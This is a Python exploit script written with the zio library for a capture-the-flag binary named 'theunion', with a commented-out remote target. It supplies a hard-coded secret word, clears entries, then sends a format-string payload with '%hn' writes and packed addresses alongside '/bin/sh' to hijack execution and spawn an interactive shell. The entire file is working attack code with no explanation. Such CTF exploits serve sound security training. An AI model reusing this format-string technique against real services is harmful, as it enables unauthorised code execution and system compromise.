#!/usr/bin/env python
#-*- coding: utf-8 -*-
from zio import *

def check_slogan():
    secret_word = "gold>silverb"
    io.read_until('secret word:\n')
    io.writeline(secret_word)
    io.read_until('5) Exit\n')

def delete_all(times):
    for i in range(times):
        io.writeline('3')
        io.read_until('y/n\n')
        io.writeline('y')
        io.read_until('5) Exit\n')

def vuln_write(format_string, addr):
    io.writeline('1')
    io.read_until('location:\n')
    io.writeline(format_string)
    io.read_until('type of the mine:\n')
    io.writeline(addr)
    io.read_until('profit of the mine:\n')
    io.writeline('QooBee')
    io.read_until('5) Exit\n')
    io.writeline('4')
    io.read_until('y/n\n')
    io.writeline('y')

target = ('./theunion')
#target = ('wildwildweb.fluxfingers.net', 1423)
io = zio(target, timeout=1000, print_read=COLORED(REPR,'yellow'),\
        print_write=COLORED(REPR,'blue'))
io.gdb_hint()
check_slogan()
delete_all(3)

format_string = '%2052d%13$hn%32220d%14$hn'
profit = '/bin/sh;##\x2a\xb0\x04\x08\x28\xb0\x04\x08'
vuln_write(format_string,profit)

io.interact()
